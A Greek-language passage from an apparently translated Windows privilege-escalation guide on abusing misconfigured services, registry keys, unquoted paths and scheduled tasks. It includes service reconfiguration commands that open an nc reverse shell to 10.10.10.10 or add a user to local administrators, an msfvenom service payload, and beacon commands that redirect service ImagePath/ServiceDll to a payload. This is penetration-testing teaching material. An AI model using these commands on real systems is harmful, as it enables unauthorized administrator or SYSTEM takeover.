Μια υπάρχουσα υπηρεσία ενδέχεται να καλεί ένα βοηθητικό εκτελέσιμο αρχείο κατά την εκκίνηση, τον τερματισμό ή κάποιο άλλο συμβάν κύκλου ζωής, ακόμη κι αν αυτό το βοηθητικό αρχείο απουσιάζει από το `ImagePath` της. Αν το όνομα του βοηθητικού αρχείου επιλύεται σε κατάλογο στον οποίο μπορεί να γράψει χρήστης με χαμηλότερα δικαιώματα και η υπηρεσία εκτελείται με υψηλότερη ταυτότητα, το αρχείο που λείπει μπορεί να αποτελεί υποψήφιο για υπό όρους αντικατάσταση. Επιβεβαιώστε τον **πραγματικό κώδικα της υπηρεσίας ή την τεκμηριωμένη κλήση του βοηθητικού αρχείου**, τη διαδρομή του εκτελέσιμου αρχείου μετά την επίλυση και τη σειρά αναζήτησης, τα δικαιώματα δημιουργίας καταλόγου, την ταυτότητα της υπηρεσίας και την ύπαρξη διαθέσιμου εναύσματος κύκλου ζωής. Ένας κατάλογος υπηρεσίας με δικαιώματα εγγραφής ή ένα αρχείο που λείπει από μόνο του δεν αποδεικνύει ότι η υπηρεσία θα φορτώσει το αρχείο· ο παθητικός έλεγχος δεν πρέπει να εκκινεί ή να διακόπτει την υπηρεσία.

Για μια υπάρχουσα υπηρεσία, το [`SERVICE_START` επιτρέπει την παροχή ορισμάτων στο `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew) και διαφέρει από το [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Εξετάστε τον κώδικα ή την τεκμηριωμένη διεπαφή της υπηρεσίας πριν θεωρήσετε ότι το δικαίωμα εκκίνησης είναι κάτι περισσότερο από δικαίωμα ελέγχου. Αν χρησιμοποιεί όρισμα που επιλέγει ο καλών ως διαδρομή αρχείου καταγραφής ή εξαγωγής, επαληθεύστε την ταυτότητα της υπηρεσίας, την ακριβή ροή από το όρισμα προς την εγγραφή, τους περιορισμούς διαδρομής και τα δικαιώματα του **αρχείου που δημιουργείται**. Μια εγγραφή σε προστατευμένο κατάλογο μπορεί να οδηγήσει σε κλιμάκωση μόνο αν υπάρχει ξεχωριστός προνομιούχος καταναλωτής ή φορτωτής που δέχεται αυτό το αρχείο· ένα αρχείο καταγραφής με δικαιώματα εγγραφής ή το δικαίωμα εκκίνησης από μόνο του δεν αρκεί. Η παθητική απογραφή δεν πρέπει να εκκινεί την υπηρεσία ή να δημιουργεί δοκιμαστικό αρχείο.

Για έναν agent παρακολούθησης NSClient++, ένα αναγνώσιμο `nsclient.ini` αποτελεί **ένδειξη για έλεγχο της διαμόρφωσης**: μπορεί να περιέχει διαπιστευτήρια web, ενώ το `boot.ini` μπορεί να ανακατευθύνει τη διαμόρφωση σε άλλη θέση. Ελέγξτε τον πραγματικό λογαριασμό υπηρεσίας, τον listener WEB και την πολιτική πρόσβασης, καθώς και αν ο αυθεντικοποιημένος ρόλος μπορεί να αλλάξει ρυθμίσεις ή scripts. Για προνομιούχα εκτέλεση απαιτούνται επιπλέον το `CheckExternalScripts` (ή άλλη ενεργοποιημένη διαδρομή εκτέλεσης), ένα ενεργό δικαίωμα καταχώρισης ή τροποποίησης εντολής και ένα έναυσμα που την εκτελεί με την ταυτότητα της υπηρεσίας. Ένας listener που δέχεται συνδέσεις μόνο από loopback μπορεί και πάλι να είναι προσβάσιμος σε τοπικό χρήστη, όμως μόνο η διαδρομή αρχείου, ο κωδικός πρόσβασης ή ο listener δεν αποδεικνύουν ότι υπάρχουν αυτά τα δικαιώματα. Ελέγξτε τα μεταδεδομένα και τα δικαιώματα χωρίς να εμφανίσετε μυστικά ή να καλέσετε το web API κατά την παθητική απαρίθμηση. Δείτε τη [διάταξη αρχείων του NSClient++](https://nsclient.org/docs/concepts/file-layout/), τις [οδηγίες ασφάλειας για web και scripts](https://nsclient.org/docs/setup/securing/) και τη [διαμόρφωση external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Για μια υπηρεσία της οποίας το `ImagePath` είναι `nssm.exe`, ελέγξτε τον πραγματικό λογαριασμό εκτέλεσης της υπηρεσίας και την τιμή `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [το NSSM αποθηκεύει εκεί την εφαρμογή-θυγατρική](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), ενώ το `AppDirectory` είναι ο διαμορφωμένος κατάλογος εργασίας της. Ελέγξτε το εκτελέσιμο αρχείο-θυγατρική και τα ACL των γονικών καταλόγων του προτού θεωρήσετε ότι τα δικαιώματα του wrapper περιγράφουν πλήρως το όριο της υπηρεσίας. Ένα τοπικό endpoint WCF ή SOAP που εκθέτει αυτή η εφαρμογή-θυγατρική αποτελεί ξεχωριστή ένδειξη προς διερεύνηση: επιβεβαιώστε ότι ο χρήστης με χαμηλότερα δικαιώματα μπορεί να φτάσει στον listener, ότι η συγκεκριμένη λειτουργία δέχεται την είσοδό του και ότι η εφαρμογή-θυγατρική εκτελεί την μη ασφαλή λειτουργία με υψηλότερη ταυτότητα. Ο λογαριασμός υπηρεσίας, μια διεύθυνση URL endpoint ή μια διαδρομή με δικαιώματα εγγραφής από μόνα τους δεν αποδεικνύουν κλιμάκωση· αποφύγετε την κλήση λειτουργιών της υπηρεσίας κατά την παθητική απαρίθμηση.

Για μια προσαρμοσμένη λειτουργία WCF, εντοπίστε τη ροή μιας συμβολοσειράς που ελέγχεται από τον καλούντα προς οποιοδήποτε PowerShell runspace. Το [`Pipeline.Commands.AddScript προσθέτει κείμενο script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), ενώ το [`Pipeline.Invoke εκτελεί το pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). Ένα [`netTcpBinding` με διαπιστευτήρια μεταφοράς Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) αυθεντικοποιεί τον client, αλλά πρέπει να ελεγχθούν ξεχωριστά η εξουσιοδότηση για κλήση αυτής της **συγκεκριμένης** λειτουργίας και η ενεργή ταυτότητα του runspace. Μια διαδρομή από είσοδο καλούντος με χαμηλότερα δικαιώματα προς το `AddScript` υπό υψηλότερη ταυτότητα υπηρεσίας αποτελεί όριο εκτέλεσης κώδικα· μια θύρα σε κατάσταση ακρόασης, ένας αυθεντικοποιημένος client ή μια αχρησιμοποίητη μέθοδος σε άσχετη assembly από μόνα τους δεν αποτελούν απόδειξη. Εξετάστε στατικά την εγκατεστημένη υπηρεσία, το contract, την εξουσιοδότηση και τις ρυθμίσεις impersonation, χωρίς να καλέσετε το endpoint κατά την απαρίθμηση.

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν ορισμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, μπορείτε συχνά να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές απαρίθμησης και ενεργοποίησης:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Υπηρεσία συλλογής διαγνωστικών του Visual Studio

Οι εγκαταστάσεις Visual Studio με εργαλεία C/C++ ενδέχεται να περιλαμβάνουν την `VSStandardCollectorService150`, μια διαγνωστική υπηρεσία διαμορφωμένη να εκτελείται ως `LocalSystem`. Η [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) χρησιμοποίησε ένα junction και μια συνθήκη ανταγωνισμού object-manager-link για να ανακατευθύνει την επαναφορά DACL μιας υπηρεσίας. Η επίδειξη κλιμάκωσης απαιτούσε επίσης μια αξιοποιήσιμη διαδρομή επιδιόρθωσης MSI για το Visual Studio Setup WMI Provider και τον στόχο `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Το στοιχείο διορθώθηκε τον Ιανουάριο του 2024.

Για παθητική διαλογή, ελέγξτε τον λογαριασμό και τη διαδρομή δυαδικού αρχείου αυτής της συγκεκριμένης υπηρεσίας, ελέγξτε αν υπάρχει η διαδρομή του Setup WMI compiler και επαληθεύστε την κατάσταση ενημέρωσης του εγκατεστημένου στοιχείου. Μια καταχώριση υπηρεσίας, η έκδοση του προϊόντος Visual Studio ή ένα αρχείο compiler από μόνα τους δεν αποδεικνύουν ότι ο host είναι ευάλωτος. Ο έλεγχος δεν χρειάζεται να εκκινήσει την υπηρεσία ή να εκτελέσει επιδιόρθωση.

Λάβετε μια λίστα υπηρεσιών:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία

```bash
sc qc <service_name>
```

Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν κάποια υπηρεσία:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν εμφανιστεί αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Δεν είναι δυνατή η εκκίνηση της υπηρεσίας, επειδή είναι απενεργοποιημένη ή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** για αυτό το πρόβλημα είναι να εκτελέσετε:

```
sc.exe config usosvc start= auto
```

### **Τροποποίηση της διαδρομής του service binary**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε ένα service, είναι δυνατή η τροποποίηση του εκτελέσιμου binary του service. Για να τροποποιήσετε και να εκτελέσετε το **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Επανεκκίνηση υπηρεσίας

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Τα προνόμια μπορούν να κλιμακωθούν μέσω διαφόρων δικαιωμάτων:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την αναδιαμόρφωση του εκτελέσιμου αρχείου της υπηρεσίας.
- **WRITE_DAC**: Επιτρέπει την αναδιαμόρφωση δικαιωμάτων, παρέχοντας τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση κυριότητας και την αναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Κληρονομεί επίσης τη δυνατότητα αλλαγής των ρυθμίσεων της υπηρεσίας.

Για τον εντοπισμό και την εκμετάλλευση αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα δικαιώματα σε δυαδικά αρχεία υπηρεσιών

Αν μια υπηρεσία εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως προνομιούχος λογαριασμός τομέα, αλλά **χρήστες με χαμηλά προνόμια μπορούν να τροποποιήσουν το EXE της υπηρεσίας ή τον γονικό φάκελό του**, η υπηρεσία μπορεί συχνά να παραβιαστεί **αντικαθιστώντας το δυαδικό αρχείο και επανεκκινώντας την υπηρεσία**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το δυαδικό αρχείο που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στον φάκελο** όπου βρίσκεται το δυαδικό αρχείο ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε όλα τα δυαδικά αρχεία που εκτελούνται από μια υπηρεσία χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας το **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Αναζητήστε επικίνδυνα ACL που έχουν εκχωρηθεί σε **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά δικαιώματα **`(F)`**, **`(M)`** ή **`(W)`** στο εκτελέσιμο αρχείο της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή εκμετάλλευσης είναι η εξής:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό υπηρεσίας και τη διαδρομή του εκτελέσιμου αρχείου με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το binary είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το binary της υπηρεσίας με ένα payload ή ένα έγκυρο κακόβουλο binary υπηρεσίας.
4. Επανεκκινήστε την υπηρεσία με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε επανεκκίνηση / ενεργοποίηση του service trigger).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν ξεκινά αυτόματα κατά την εκκίνηση, αν έχει ενέργεια αποτυχίας που την επανεκκινεί ή αν η εφαρμογή που τη χρησιμοποιεί μπορεί να την ενεργοποιήσει έμμεσα.

### Δικαιώματα τροποποίησης μητρώου υπηρεσίας

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε το μητρώο κάποιας υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας στο **μητρώο** μιας υπηρεσίας ως εξής:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Ελέγξτε αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα εγγραφής στο registry για ένα συγκεκριμένο κλειδί υπηρεσίας. Μια καταχώριση ACL από μόνη της δεν αποδεικνύει ότι υπάρχει αποτελεσματική πρόσβαση: σημασία έχουν οι καταχωρίσεις άρνησης, το τρέχον token και τα κληρονομημένα δικαιώματα. Τα δικαιώματα κλειδιού registry είναι ξεχωριστά από τα δικαιώματα `SERVICE_CHANGE_CONFIG` και `SERVICE_START` του αντικειμένου υπηρεσίας. Για να γίνει κλιμάκωση απαιτείται επίσης ένα αξιοποιήσιμο πεδίο διαμόρφωσης της υπηρεσίας, ένας τρόπος ενεργοποίησής της και μια ταυτότητα υπηρεσίας με υψηλότερα προνόμια. Δείτε τα [δικαιώματα κλειδιών registry](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) της Microsoft και την [αναφορά δικαιωμάτων πρόσβασης υπηρεσιών](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Για να αλλάξετε το Path του binary που εκτελείται:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race συνδέσμου συμβόλων στο Registry για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία στη συνέχεια αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **race condition συμβολικού συνδέσμου** στο Registry μπορεί να ανακατευθύνει αυτήν την προνομιούχα εγγραφή σε **οποιαδήποτε διαδρομή HKLM**, παρέχοντας δυνατότητα **εγγραφής αυθαίρετης τιμής** HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` παραθέτει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει τη διαμόρφωση που ελέγχει ο χρήστης.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά τη σύνδεση ή τις μεταβάσεις σε ασφαλή επιφάνεια εργασίας και είναι εγγράψιμο από τον χρήστη.

Ροή κατάχρησης (CVE-2026-24291 / ATConfig):

1. Συμπληρώστε την τιμή **HKCU ATConfig** που θέλετε να εγγραφεί από το SYSTEM.
2. Ενεργοποιήστε την αντιγραφή στην ασφαλή επιφάνεια εργασίας (π.χ., **LockWorkstation**), η οποία ξεκινά τη ροή AT broker.
3. **Κερδίστε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`. Όταν ενεργοποιηθεί το oplock, αντικαταστήστε το κλειδί **HKLM Session ATConfig** με έναν **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM εγγράφει την τιμή που επέλεξε ο εισβολέας στη διαδρομή που ανακατευθύνθηκε.

Μόλις αποκτήσετε δυνατότητα εγγραφής αυθαίρετης τιμής HKLM, προχωρήστε σε LPE αντικαθιστώντας τιμές διαμόρφωσης υπηρεσίας:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/γραμμή εντολών)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επιλέξτε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ., **`msiserver`**) και ενεργοποιήστε την μετά την εγγραφή. **Σημείωση:** η δημόσια υλοποίηση του exploit **κλειδώνει τον σταθμό εργασίας** στο πλαίσιο του race.

Ενδεικτικά εργαλεία (RegPwn BOF / αυτόνομο):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Δικαιώματα AppendData/AddSubdirectory στο registry των services

Αν έχετε αυτό το δικαίωμα σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries μέσα σε αυτό**. Στην περίπτωση των Windows services, αυτό **αρκεί για την εκτέλεση arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν η διαδρομή προς ένα εκτελέσιμο αρχείο δεν βρίσκεται μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα της διαδρομής που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Παραθέστε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας εκείνες που ανήκουν στις ενσωματωμένες υπηρεσίες των Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα service binary με το metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες υπάρχουν στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Στόχοι script προγραμματισμένων εργασιών

Για μια ενεργοποιημένη εργασία που εκτελεί `cmd.exe /c` με αρχείο `.bat` ή `.cmd`, ελέγξτε το script που αναφέρεται στα **ορίσματα ενέργειας**, καθώς και το `cmd.exe`. Το ίδιο ισχύει για το ρητό όρισμα αρχείου ενός interpreter, όπως το PowerShell `-File`. Αν ένα προγραμματισμένο batch file περιέχει κυριολεκτική κλήση PowerShell `-File`, ελέγξτε και τα ACL του script στο οποίο παραπέμπει· οι μεταβλητές, οι συνθήκες και η αλυσιδωτή εκτέλεση εντολών απαιτούν χειροκίνητη ιχνηλάτηση. Ένα script ή ένας γονικός κατάλογος στον οποίο μπορεί να γράψει ο καλών αποτελεί ένδειξη για εκτέλεση μεταξύ λογαριασμών μόνο όταν το task principal που έχει ρυθμιστεί διαφέρει από τον καλούντα και η εργασία φτάνει πράγματι σε αυτή την ενέργεια. Ένα ACL που επιτρέπει μόνο προσθήκη δεδομένων μπορεί να έχει σημασία για scripts, αλλά ένα προηγούμενο `exit` ή άλλη ροή ελέγχου μπορεί να καταστήσει τις γραμμές που προστίθενται μη προσβάσιμες. Επιβεβαιώστε τα πραγματικά ACL, το [περιβάλλον εκτέλεσης της εργασίας](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), τον κατάλογο εργασίας, το trigger και την πολιτική ελέγχου εφαρμογών πριν καταλήξετε ότι υπάρχει δυνατότητα privilege escalation. Η απογραφή δεν πρέπει να τροποποιεί το script ή να εκκινεί την εργασία.

## Named streams σε προσβάσιμα αρχεία

Στο NTFS, ένα αναγνώσιμο αρχείο μπορεί να έχει ένα named `:$DATA` stream, το περιεχόμενο του οποίου δεν εμφανίζεται σε μια συνηθισμένη καταχώριση καταλόγου. Για ένα μικρό, σχετικό σύνολο προσβάσιμων αντιγράφων ασφαλείας ή αρχείων ρυθμίσεων, εξετάστε τα **ονόματα και τα μεγέθη** των streams πριν ανοίξετε οποιοδήποτε περιεχόμενο· τα Windows τα εκθέτουν μέσω των [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), καθώς και μέσω του PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ένα όνομα stream που υποδηλώνει μυστικό αποτελεί απλώς ένδειξη. Ελέγξτε την πραγματική πρόσβαση ανάγνωσης του αρχείου, αν το filesystem υποστηρίζει streams, αν το stream περιέχει αξιοποιήσιμα credentials και σε ποιον λογαριασμό γίνεται πράγματι η αυθεντικοποίηση. Αποφύγετε τις αναδρομικές σαρώσεις streams και την εκτύπωση του περιεχομένου τους κατά τη συνήθη απογραφή.

## Είσοδοι helper του Windows Driver Kit σε προγραμματισμένες εργασίες

Το προαιρετικό Windows Driver Kit περιλαμβάνει το `StandaloneRunner.exe`, το οποίο μπορεί να χρησιμοποιήσει τα αρχεία `command.txt`, `reboot.rsf` και `working\rsf.rsf` ενός project από τον κατάλογο εκτέλεσής του. Μια προγραμματισμένη εργασία ή υπηρεσία που εκκινεί αυτό το helper με privileged λογαριασμό μπορεί να μετατρέψει την πρόσβαση εγγραφής χαμηλών προνομίων σε αυτά τα αρχεία εισόδου σε εκτέλεση εντολών στο περιβάλλον αυτού του λογαριασμού, ακόμη κι αν το ίδιο το εκτελέσιμο του helper είναι προστατευμένο. Επιβεβαιώστε ότι υπάρχει privileged καταναλωτής και ότι **και τα δύο** συνοδευτικά αρχεία μπορούν να δημιουργηθούν ή να τροποποιηθούν· το να εντοπιστεί μόνο το helper δεν αρκεί.

Για μια προγραμματισμένη εργασία, ελέγξτε το [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) της ενέργειάς της και τα ACL των δύο διαδρομών των συνοδευτικών αρχείων. Αν η εργασία δεν καθορίζει κατάλογο εργασίας, ο κατάλογος του εκτελέσιμου είναι απλώς μια ένδειξη που πρέπει να επαληθευτεί, όχι απόδειξη για το από πού διαβάζει η εργασία τα αρχεία εισόδου της. Πρέπει επίσης να ικανοποιείται η προϋπόθεση του αρχείου εργασίας του project. Ελέγξτε το πραγματικό task principal αντί να υποθέσετε ότι εκτελείται ως SYSTEM.

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να κάνετε privilege escalation) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Διαδρομή επιδιόρθωσης του Windows agent του Checkmk

Το [CVE-2024-0670](https://checkmk.com/werk/16361) επηρεάζει παλαιότερους Windows agents του Checkmk, οι οποίοι έγραφαν αρχεία εντολών στο `C:\Windows\Temp` και, αν αποτύγχανε η αντικατάσταση, εκτελούσαν ένα προϋπάρχον αρχείο με προστασία εγγραφής. Ο προμηθευτής διόρθωσε το πρόβλημα στις εκδόσεις 2.1.0p40, 2.2.0p23, 2.3.0b1 και 2.4.0b1. Ελέγξτε το πλήρες εγκατεστημένο επίπεδο ενημερώσεων και αν μπορεί να εκτελεστεί η επηρεαζόμενη λειτουργία του agent· μια ένδειξη μόνο του κλάδου, όπως `2.1`, δεν αρκεί για να διαπιστωθεί αν υπάρχει έκθεση. Η απαρίθμηση μπορεί να ελέγξει την έκδοση, την κατάσταση της υπηρεσίας και τα δικαιώματα του Temp χωρίς να δημιουργήσει αρχεία ή να ενεργοποιήσει εντολές του agent.

#### Έλεγχος της υπηρεσίας SAML του ADSelfService Plus

